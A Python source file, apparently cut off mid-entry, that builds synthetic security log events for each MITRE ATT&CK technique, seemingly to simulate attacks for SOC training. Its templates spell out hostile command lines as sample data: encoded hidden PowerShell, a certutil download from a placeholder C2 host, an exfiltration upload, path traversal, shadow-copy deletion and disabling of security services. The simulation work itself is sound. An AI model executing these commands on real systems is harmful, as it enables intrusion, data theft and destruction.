"""TTP event template library — pre-seeded + LLM-cached templates.

Token savings: LLM is only called once per (technique_id, log_source) pair.
Subsequent simulations use DB-cached templates with fresh assets/IOCs injected.
"""
from __future__ import annotations

import re
import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

from sqlalchemy import select, update, func
from sqlalchemy.ext.asyncio import AsyncSession

from backend.db.models import Environment, SimulatedEndpoint, SimulatedUser
from backend.engine.product_catalog import resolve_schema_for_component


# ── Builtin template library ──────────────────────────────────────────────────

BUILTIN_TEMPLATES: list[dict[str, Any]] = [

    # ── Initial Access ────────────────────────────────────────────────────────

    {
        "technique_id": "T1566.001",
        "tactic": "initial-access",
        "log_source": "email_security",
        "severity": "high",
        "title_template": "Malicious attachment opened by {username} — macro execution detected",
        "payload_template": {
            "EventID": "12345",
            "sender": "invoice-noreply@{c2_domain}",
            "recipient": "{email}",
            "subject": "Q4 Invoice #INV-{dest_port} — Action Required",
            "attachment_name": "Invoice_Q4.xlsm",
            "attachment_hash": "{file_hash}",
            "action": "attachment_opened",
            "macro_detected": True,
            "sandbox_verdict": "malicious",
            "client_ip": "{src_ip}",
            "hostname": "{hostname}",
        },
        "variables": {
            "{username}": "victim username",
            "{email}": "victim email",
            "{c2_domain}": "attacker-controlled sending domain",
            "{file_hash}": "SHA-256 of the attachment",
            "{src_ip}": "recipient workstation IP",
            "{hostname}": "recipient workstation hostname",
            "{dest_port}": "used as a random invoice number suffix",
        },
    },
    {
        "technique_id": "T1566.001",
        "tactic": "initial-access",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Office macro spawned suspicious child process on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c powershell -enc {b64_cmd}",
            "ParentProcessName": "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
            "NewProcessId": "0x2d4c",
            "TokenElevationType": "TokenElevationTypeLimited",
        },
        "variables": {
            "{hostname}": "workstation where macro ran",
            "{username}": "user who opened the document",
            "{b64_cmd}": "base64-encoded PowerShell stage",
        },
    },

    {
        "technique_id": "T1133",
        "tactic": "initial-access",
        "log_source": "auth",
        "severity": "medium",
        "title_template": "VPN login from unusual geo-location for {username}",
        "payload_template": {
            "user": "{username}",
            "src_ip": "{c2_ip}",
            "auth_type": "vpn",
            "result": "success",
            "domain": "{domain}",
            "geo_country": "RU",
            "geo_city": "Moscow",
            "device_id": "UNKNOWN",
            "risk_score": 87,
        },
        "variables": {
            "{username}": "user account used for VPN access",
            "{c2_ip}": "attacker source IP (unusual geo)",
            "{domain}": "AD domain of the user",
        },
    },
    {
        "technique_id": "T1133",
        "tactic": "initial-access",
        "log_source": "firewall",
        "severity": "medium",
        "title_template": "RDP inbound from external IP {c2_ip} to {server}",
        "payload_template": {
            "src_ip": "{c2_ip}",
            "dst_ip": "{server_ip}",
            "dst_port": "3389",
            "protocol": "TCP",
            "action": "allow",
            "bytes_in": 48200,
            "bytes_out": 1204,
            "rule_name": "EXTERNAL_RDP_ALLOW",
        },
        "variables": {
            "{c2_ip}": "external attacker IP",
            "{server}": "target server hostname",
            "{server_ip}": "target server IP",
        },
    },

    {
        "technique_id": "T1190",
        "tactic": "initial-access",
        "log_source": "proxy",
        "severity": "critical",
        "title_template": "WAF blocked exploit attempt against {server} from {c2_ip}",
        "payload_template": {
            "src_ip": "{c2_ip}",
            "dst_ip": "{server_ip}",
            "url": "https://{server}/cgi-bin/../../../../etc/passwd",
            "method": "GET",
            "status_code": 403,
            "waf_rule": "981176",
            "user_agent": "python-requests/2.28.0",
            "bytes": 342,
        },
        "variables": {
            "{c2_ip}": "attacker source IP",
            "{server}": "targeted public-facing server",
            "{server_ip}": "targeted server IP",
        },
    },

    # ── Execution ─────────────────────────────────────────────────────────────

    {
        "technique_id": "T1059.001",
        "tactic": "execution",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "PowerShell execution with encoded command on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc {b64_cmd}",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "NewProcessId": "0x1fa8",
            "TokenElevationType": "TokenElevationTypeFull",
        },
        "variables": {
            "{hostname}": "endpoint where PS ran",
            "{username}": "user context",
            "{b64_cmd}": "base64-encoded payload",
        },
    },
    {
        "technique_id": "T1059.001",
        "tactic": "execution",
        "log_source": "sysmon",
        "severity": "high",
        "title_template": "Sysmon EID 1 — PowerShell spawned with bypass flags on {hostname}",
        "payload_template": {
            "EventID": "1",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\\Temp\\stager.ps1",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Hashes": "SHA256={file_hash}",
            "User": "{domain}\\{username}",
            "IntegrityLevel": "High",
            "Computer": "{hostname}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "executing user",
            "{domain}": "AD domain",
            "{file_hash}": "hash of the PS script",
        },
    },

    {
        "technique_id": "T1059.003",
        "tactic": "execution",
        "log_source": "windows_eventlog",
        "severity": "medium",
        "title_template": "cmd.exe spawned unusual child process on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c \"net user administrator {b64_cmd} & net localgroup administrators {username} /add\"",
            "ParentProcessName": "C:\\Windows\\System32\\services.exe",
            "NewProcessId": "0x3c14",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user account being modified",
            "{b64_cmd}": "used here as a stand-in password token",
        },
    },

    {
        "technique_id": "T1047",
        "tactic": "execution",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "wmic.exe process call create on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\wbem\\wmic.exe",
            "CommandLine": "wmic process call create \"powershell -enc {b64_cmd}\"",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user context",
            "{b64_cmd}": "encoded PS payload",
        },
    },
    {
        "technique_id": "T1047",
        "tactic": "execution",
        "log_source": "sysmon",
        "severity": "high",
        "title_template": "Sysmon WMI subscription created on {hostname}",
        "payload_template": {
            "EventID": "19",
            "Computer": "{hostname}",
            "EventType": "WmiEventFilterActivity",
            "Name": "SystemMonitor",
            "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
            "User": "{domain}\\{username}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user that registered the subscription",
            "{domain}": "AD domain",
        },
    },

    {
        "technique_id": "T1053.005",
        "tactic": "execution",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Scheduled task created for persistence on {hostname}",
        "payload_template": {
            "EventID": "4698",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "TaskName": "\\Microsoft\\Windows\\MUI\\GoogleUpdateTaskMachine",
            "TaskContent": "<Actions><Exec><Command>powershell</Command><Arguments>-enc {b64_cmd}</Arguments></Exec></Actions>",
            "ClientProcessId": "0x1d88",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user that created the task",
            "{b64_cmd}": "encoded PS payload in task arguments",
        },
    },

    # ── Persistence ───────────────────────────────────────────────────────────

    {
        "technique_id": "T1543.003",
        "tactic": "persistence",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "New Windows service installed on {hostname}",
        "payload_template": {
            "EventID": "7045",
            "Computer": "{hostname}",
            "ServiceName": "WindowsUpdateFacilitator",
            "ServiceFileName": "C:\\Windows\\Temp\\{file_hash}.exe",
            "ServiceType": "user mode service",
            "ServiceStartType": "auto start",
            "ServiceAccount": "LocalSystem",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{file_hash}": "used as a generic hex token in the malware filename",
        },
    },

    {
        "technique_id": "T1547.001",
        "tactic": "persistence",
        "log_source": "sysmon",
        "severity": "medium",
        "title_template": "Registry Run key written for persistence on {hostname}",
        "payload_template": {
            "EventID": "13",
            "Computer": "{hostname}",
            "EventType": "SetValue",
            "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate",
            "Details": "C:\\ProgramData\\Microsoft\\Windows\\{file_hash}.exe",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "User": "{domain}\\{username}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{file_hash}": "hash token used as filename",
            "{username}": "user context",
            "{domain}": "AD domain",
        },
    },

    # ── Privilege Escalation ──────────────────────────────────────────────────

    {
        "technique_id": "T1548.002",
        "tactic": "privilege-escalation",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "UAC bypass via fodhelper.exe on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\fodhelper.exe",
            "CommandLine": "fodhelper.exe",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "TokenElevationType": "TokenElevationTypeFull",
            "MandatoryLabel": "S-1-16-12288",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user performing the bypass",
        },
    },
    {
        "technique_id": "T1548.002",
        "tactic": "privilege-escalation",
        "log_source": "sysmon",
        "severity": "high",
        "title_template": "eventvwr.exe UAC bypass — registry hijack on {hostname}",
        "payload_template": {
            "EventID": "13",
            "Computer": "{hostname}",
            "TargetObject": "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command",
            "Details": "C:\\Users\\{username}\\AppData\\Local\\Temp\\payload.exe",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "User": "{domain}\\{username}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user",
            "{domain}": "AD domain",
        },
    },

    # ── Defense Evasion ───────────────────────────────────────────────────────

    {
        "technique_id": "T1027",
        "tactic": "defense-evasion",
        "log_source": "windows_eventlog",
        "severity": "medium",
        "title_template": "Base64-encoded PowerShell command executed on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -ep bypass -w hidden -enc {b64_cmd}",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user context",
            "{b64_cmd}": "obfuscated payload",
        },
    },

    {
        "technique_id": "T1070.001",
        "tactic": "defense-evasion",
        "log_source": "windows_eventlog",
        "severity": "critical",
        "title_template": "Audit log cleared on {hostname}",
        "payload_template": {
            "EventID": "1102",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "SubjectDomainName": "{domain}",
            "SubjectLogonId": "0x4f6c1",
            "Channel": "Security",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user who cleared the log",
            "{domain}": "AD domain",
        },
    },

    {
        "technique_id": "T1112",
        "tactic": "defense-evasion",
        "log_source": "sysmon",
        "severity": "medium",
        "title_template": "Registry value modified to disable Windows Defender on {hostname}",
        "payload_template": {
            "EventID": "14",
            "Computer": "{hostname}",
            "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
            "OldValue": "DWORD (0x00000000)",
            "NewValue": "DWORD (0x00000001)",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "User": "{domain}\\{username}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user context",
            "{domain}": "AD domain",
        },
    },

    # ── Credential Access ─────────────────────────────────────────────────────

    {
        "technique_id": "T1003.001",
        "tactic": "credential-access",
        "log_source": "edr",
        "severity": "critical",
        "title_template": "LSASS memory access detected on {hostname}",
        "payload_template": {
            "process_name": "procdump.exe",
            "hash": "{file_hash}",
            "parent_process": "C:\\Windows\\System32\\cmd.exe",
            "alert_name": "Credential Dumping: LSASS Memory",
            "action_taken": "blocked",
            "target_process": "lsass.exe",
            "access_mask": "0x1FFFFF",
            "hostname": "{hostname}",
            "user": "{username}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user context",
            "{file_hash}": "hash of procdump or mimikatz",
        },
    },
    {
        "technique_id": "T1003.001",
        "tactic": "credential-access",
        "log_source": "sysmon",
        "severity": "critical",
        "title_template": "Sysmon EID 10 — process access on lsass.exe from {hostname}",
        "payload_template": {
            "EventID": "10",
            "Computer": "{hostname}",
            "SourceImage": "C:\\Windows\\Temp\\loader.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+0x9f5b4|C:\\Windows\\System32\\KERNELBASE.dll+0x10e38",
            "User": "{domain}\\{username}",
            "Hashes": "SHA256={file_hash}",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user running the dumper",
            "{domain}": "AD domain",
            "{file_hash}": "hash of the accessing process",
        },
    },

    {
        "technique_id": "T1078",
        "tactic": "credential-access",
        "log_source": "auth",
        "severity": "high",
        "title_template": "Valid account login from anomalous IP for {username}",
        "payload_template": {
            "user": "{username}",
            "src_ip": "{c2_ip}",
            "auth_type": "ldap",
            "result": "success",
            "domain": "{domain}",
            "event_id": "4624",
            "logon_type": "3",
            "workstation": "UNKNOWN",
            "risk_signal": "impossible_travel",
        },
        "variables": {
            "{username}": "compromised account",
            "{c2_ip}": "attacker IP",
            "{domain}": "AD domain",
        },
    },

    {
        "technique_id": "T1110.003",
        "tactic": "credential-access",
        "log_source": "auth",
        "severity": "high",
        "title_template": "Password spray — multiple failed logins across accounts from {c2_ip}",
        "payload_template": {
            "src_ip": "{c2_ip}",
            "auth_type": "ntlm",
            "result": "failure",
            "domain": "{domain}",
            "failed_accounts": ["{username}", "administrator", "svc-backup", "helpdesk"],
            "attempt_count": 47,
            "window_seconds": 120,
            "error_code": "0xC000006A",
        },
        "variables": {
            "{c2_ip}": "attacker source IP",
            "{username}": "one of the targeted accounts",
            "{domain}": "AD domain",
        },
    },

    # ── Discovery ─────────────────────────────────────────────────────────────

    {
        "technique_id": "T1082",
        "tactic": "discovery",
        "log_source": "windows_eventlog",
        "severity": "low",
        "title_template": "systeminfo.exe executed for host reconnaissance on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\systeminfo.exe",
            "CommandLine": "systeminfo",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "target endpoint",
            "{username}": "user context",
        },
    },

    {
        "technique_id": "T1135",
        "tactic": "discovery",
        "log_source": "windows_eventlog",
        "severity": "low",
        "title_template": "Network share enumeration via net.exe on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net view \\\\{server} /all",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "source endpoint",
            "{username}": "user context",
            "{server}": "target server being enumerated",
        },
    },

    {
        "technique_id": "T1016",
        "tactic": "discovery",
        "log_source": "windows_eventlog",
        "severity": "low",
        "title_template": "Network configuration discovery via ipconfig on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\ipconfig.exe",
            "CommandLine": "ipconfig /all",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user context",
        },
    },
    {
        "technique_id": "T1016",
        "tactic": "discovery",
        "log_source": "windows_eventlog",
        "severity": "medium",
        "title_template": "nmap scan launched from {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Program Files (x86)\\Nmap\\nmap.exe",
            "CommandLine": "nmap -sV -p 22,80,443,3389,445,139 {server_ip}/24",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "source endpoint",
            "{username}": "user context",
            "{server_ip}": "network range being scanned",
        },
    },

    # ── Lateral Movement ──────────────────────────────────────────────────────

    {
        "technique_id": "T1021.001",
        "tactic": "lateral-movement",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "RDP lateral movement — {username} logged on to {server}",
        "payload_template": {
            "EventID": "4624",
            "Computer": "{server}",
            "TargetUserName": "{username}",
            "TargetDomainName": "{domain}",
            "LogonType": "10",
            "IpAddress": "{src_ip}",
            "IpPort": "49{dest_port}",
            "AuthenticationPackageName": "Negotiate",
        },
        "variables": {
            "{server}": "destination server",
            "{username}": "account used",
            "{domain}": "AD domain",
            "{src_ip}": "source workstation IP",
            "{dest_port}": "used as ephemeral port suffix",
        },
    },
    {
        "technique_id": "T1021.001",
        "tactic": "lateral-movement",
        "log_source": "firewall",
        "severity": "medium",
        "title_template": "Internal RDP traffic {src_ip} -> {server_ip}:{dest_port}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{server_ip}",
            "dst_port": "3389",
            "protocol": "TCP",
            "action": "allow",
            "bytes_in": 21400,
            "bytes_out": 8900,
            "duration_seconds": 312,
            "rule_name": "INTERNAL_EAST_WEST",
        },
        "variables": {
            "{src_ip}": "source workstation",
            "{server_ip}": "destination server",
            "{dest_port}": "destination port (3389)",
        },
    },

    {
        "technique_id": "T1021.002",
        "tactic": "lateral-movement",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "SMB share access to admin share on {server}",
        "payload_template": {
            "EventID": "5140",
            "Computer": "{server}",
            "SubjectUserName": "{username}",
            "SubjectDomainName": "{domain}",
            "ShareName": "\\\\*\\ADMIN$",
            "ShareLocalPath": "%SystemRoot%",
            "AccessMask": "0x1",
            "IpAddress": "{src_ip}",
        },
        "variables": {
            "{server}": "target server",
            "{username}": "account used for SMB access",
            "{domain}": "AD domain",
            "{src_ip}": "source IP",
        },
    },

    {
        "technique_id": "T1550.002",
        "tactic": "lateral-movement",
        "log_source": "windows_eventlog",
        "severity": "critical",
        "title_template": "Pass-the-Hash — logon type 9 from {src_ip} to {server}",
        "payload_template": {
            "EventID": "4624",
            "Computer": "{server}",
            "TargetUserName": "{username}",
            "TargetDomainName": "{domain}",
            "LogonType": "9",
            "LogonProcessName": "seclogo",
            "AuthenticationPackageName": "Negotiate",
            "IpAddress": "{src_ip}",
            "KeyLength": "0",
        },
        "variables": {
            "{server}": "target server",
            "{username}": "account whose hash was used",
            "{domain}": "AD domain",
            "{src_ip}": "source of the PtH attempt",
        },
    },

    # ── Collection ────────────────────────────────────────────────────────────

    {
        "technique_id": "T1560.001",
        "tactic": "collection",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "7-Zip archiving of sensitive directories on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Program Files\\7-Zip\\7z.exe",
            "CommandLine": "7z.exe a -p{b64_cmd} C:\\Temp\\backup.7z C:\\Users\\{username}\\Documents\\* C:\\Finance\\*",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user context",
            "{b64_cmd}": "used as archive password token",
        },
    },

    {
        "technique_id": "T1074.001",
        "tactic": "collection",
        "log_source": "sysmon",
        "severity": "medium",
        "title_template": "Large file staging in Temp directory on {hostname}",
        "payload_template": {
            "EventID": "11",
            "Computer": "{hostname}",
            "Image": "C:\\Windows\\System32\\robocopy.exe",
            "TargetFilename": "C:\\Temp\\staged_data.zip",
            "User": "{domain}\\{username}",
            "CreationUtcTime": "2026-06-04T10:22:11.000Z",
            "file_size_mb": 847,
        },
        "variables": {
            "{hostname}": "endpoint",
            "{username}": "user staging the data",
            "{domain}": "AD domain",
        },
    },

    # ── Command and Control ───────────────────────────────────────────────────

    {
        "technique_id": "T1071.001",
        "tactic": "command-and-control",
        "log_source": "proxy",
        "severity": "high",
        "title_template": "Periodic beaconing to {c2_domain} detected from {hostname}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "url": "{c2_url}",
            "method": "POST",
            "status_code": 200,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "bytes": 348,
            "response_bytes": 124,
            "interval_seconds": 300,
            "beacon_count": 12,
            "hostname": "{hostname}",
        },
        "variables": {
            "{src_ip}": "beaconing endpoint IP",
            "{c2_domain}": "C2 domain",
            "{c2_url}": "full C2 URL",
            "{hostname}": "beaconing endpoint",
        },
    },
    {
        "technique_id": "T1071.001",
        "tactic": "command-and-control",
        "log_source": "firewall",
        "severity": "medium",
        "title_template": "Suspicious HTTPS outbound to {c2_ip} from {hostname}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{c2_ip}",
            "dst_port": "443",
            "protocol": "TCP",
            "action": "allow",
            "bytes_out": 14820,
            "bytes_in": 4200,
            "duration_seconds": 86400,
            "connection_count": 288,
        },
        "variables": {
            "{src_ip}": "victim endpoint IP",
            "{c2_ip}": "C2 server IP",
            "{hostname}": "victim endpoint hostname",
        },
    },

    {
        "technique_id": "T1071.004",
        "tactic": "command-and-control",
        "log_source": "dns",
        "severity": "high",
        "title_template": "DNS tunneling — unusual TXT queries to {c2_domain} from {hostname}",
        "payload_template": {
            "query": "aGVsbG8gd29ybGQ.{c2_domain}",
            "query_type": "TXT",
            "answer": "NXDOMAIN",
            "client_ip": "{src_ip}",
            "query_length": 62,
            "queries_per_minute": 34,
            "entropy_score": 4.7,
            "hostname": "{hostname}",
        },
        "variables": {
            "{c2_domain}": "C2 domain used for DNS tunneling",
            "{src_ip}": "client IP making the queries",
            "{hostname}": "source endpoint",
        },
    },
    {
        "technique_id": "T1071.004",
        "tactic": "command-and-control",
        "log_source": "dns",
        "severity": "medium",
        "title_template": "High-frequency PTR queries to unknown domain {c2_domain}",
        "payload_template": {
            "query": "{c2_domain}",
            "query_type": "PTR",
            "answer": "",
            "client_ip": "{src_ip}",
            "queries_last_hour": 1840,
            "unique_subdomains": 220,
            "hostname": "{hostname}",
        },
        "variables": {
            "{c2_domain}": "suspicious domain",
            "{src_ip}": "client IP",
            "{hostname}": "source endpoint",
        },
    },

    {
        "technique_id": "T1573.001",
        "tactic": "command-and-control",
        "log_source": "firewall",
        "severity": "high",
        "title_template": "Long-duration encrypted TCP session to {c2_ip}:{dest_port}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{c2_ip}",
            "dst_port": "{dest_port}",
            "protocol": "TCP",
            "action": "allow",
            "bytes_out": 248000,
            "bytes_in": 18200,
            "duration_seconds": 43200,
            "tls_version": "TLSv1.3",
            "ja3_hash": "a0e9f5d64349fb13191bc781f81f42e1",
        },
        "variables": {
            "{src_ip}": "victim endpoint",
            "{c2_ip}": "C2 server",
            "{dest_port}": "non-standard port for encrypted channel",
        },
    },

    # ── Exfiltration ──────────────────────────────────────────────────────────

    {
        "technique_id": "T1041",
        "tactic": "exfiltration",
        "log_source": "firewall",
        "severity": "critical",
        "title_template": "Large data exfiltration to C2 {c2_ip} from {hostname}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{c2_ip}",
            "dst_port": "443",
            "protocol": "TCP",
            "action": "allow",
            "bytes_out": 5242880000,
            "bytes_in": 12400,
            "duration_seconds": 7200,
            "threshold_exceeded": True,
            "hostname": "{hostname}",
        },
        "variables": {
            "{src_ip}": "exfiltrating endpoint",
            "{c2_ip}": "destination C2",
            "{hostname}": "source endpoint",
        },
    },

    {
        "technique_id": "T1048.003",
        "tactic": "exfiltration",
        "log_source": "proxy",
        "severity": "critical",
        "title_template": "Large unencrypted upload to external host {c2_ip}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "url": "http://{c2_ip}/upload",
            "method": "POST",
            "status_code": 200,
            "user_agent": "curl/7.68.0",
            "bytes": 1048576000,
            "content_type": "application/octet-stream",
            "hostname": "{hostname}",
        },
        "variables": {
            "{src_ip}": "exfiltrating endpoint",
            "{c2_ip}": "destination IP (plain HTTP)",
            "{hostname}": "source endpoint",
        },
    },

    # ── Impact ────────────────────────────────────────────────────────────────

    {
        "technique_id": "T1486",
        "tactic": "impact",
        "log_source": "edr",
        "severity": "critical",
        "title_template": "Ransomware file rename activity detected on {hostname}",
        "payload_template": {
            "process_name": "ryuk.exe",
            "hash": "{file_hash}",
            "parent_process": "C:\\Windows\\System32\\cmd.exe",
            "alert_name": "Ransomware: Mass File Encryption",
            "action_taken": "process_killed",
            "files_renamed": 8421,
            "extension_added": ".ryuk",
            "hostname": "{hostname}",
            "user": "{username}",
        },
        "variables": {
            "{hostname}": "victim endpoint",
            "{file_hash}": "ransomware binary hash",
            "{username}": "user context (often SYSTEM)",
        },
    },
    {
        "technique_id": "T1486",
        "tactic": "impact",
        "log_source": "windows_eventlog",
        "severity": "critical",
        "title_template": "vssadmin deleting shadow copies on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\vssadmin.exe",
            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "TokenElevationType": "TokenElevationTypeFull",
        },
        "variables": {
            "{hostname}": "target endpoint",
            "{username}": "user context (often SYSTEM or admin)",
        },
    },

    {
        "technique_id": "T1489",
        "tactic": "impact",
        "log_source": "windows_eventlog",
        "severity": "critical",
        "title_template": "Critical services stopped via net.exe on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net stop \"SQL Server (MSSQLSERVER)\" && net stop \"Windows Defender\" && net stop \"EventLog\"",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
        "variables": {
            "{hostname}": "target endpoint",
            "{username}": "user context",
        },
    },
    {
        "technique_id": "T1489",
        "tactic": "impact",
        "log_source": "edr",
        "severity": "critical",
        "title_template": "EDR alert — security service termination on {hostname}",
        "payload_template": {
            "process_name": "sc.exe",
            "hash": "{file_hash}",
            "parent_process": "C:\\Windows\\System32\\cmd.exe",
            "alert_name": "Security Tool Tampering: Service Termination",
            "action_taken": "alerted",
            "services_stopped": ["WinDefend", "MsMpSvc", "SCCM", "EventLog"],
            "hostname": "{hostname}",
            "user": "{username}",
        },
        "variables": {
            "{hostname}": "target endpoint",
            "{file_hash}": "sc.exe is a signed binary — hash used as surrogate",
            "{username}": "user context",
        },
    },

    # ── Additional templates for common APT/ransomware techniques ─────────────

    {
        "technique_id": "T1059",
        "tactic": "execution",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Command interpreter spawned from suspicious parent on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c whoami /all && net localgroup administrators",
            "ParentProcessName": "C:\\Users\\{username}\\AppData\\Local\\Temp\\update.exe",
            "NewProcessId": "0x1a4c",
        },
    },
    {
        "technique_id": "T1055.001",
        "tactic": "defense-evasion",
        "log_source": "sysmon",
        "severity": "critical",
        "title_template": "Remote thread injected into system process on {hostname}",
        "payload_template": {
            "EventID": "8",
            "Computer": "{hostname}",
            "SourceImage": "C:\\Users\\{username}\\AppData\\Roaming\\{malware}",
            "SourceProcessId": "0x25cc",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "TargetProcessId": "0x4a8",
            "StartAddress": "0x7ffb4a3c1000",
            "GrantedAccess": "0x1FFFFF",
            "Hashes": "SHA256={file_hash}",
        },
    },
    {
        "technique_id": "T1055.001",
        "tactic": "defense-evasion",
        "log_source": "edr",
        "severity": "critical",
        "title_template": "DLL injection into explorer.exe detected on {hostname}",
        "payload_template": {
            "alert_name": "Process Injection: DLL Injection",
            "process_name": "{malware}",
            "hash": "{file_hash}",
            "target_process": "explorer.exe",
            "injection_method": "CreateRemoteThread",
            "action_taken": "blocked",
            "hostname": "{hostname}",
            "user": "{username}",
        },
    },
    {
        "technique_id": "T1105",
        "tactic": "command-and-control",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Payload downloaded via certutil from C2 on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://{c2_ip}/beacon.exe C:\\Users\\Public\\beacon.exe",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "NewProcessId": "0x3a4c",
        },
    },
    {
        "technique_id": "T1105",
        "tactic": "command-and-control",
        "log_source": "proxy",
        "severity": "high",
        "title_template": "Ingress tool transfer: binary download from C2 server",
        "payload_template": {
            "url": "http://{c2_ip}/tools/implant.exe",
            "method": "GET",
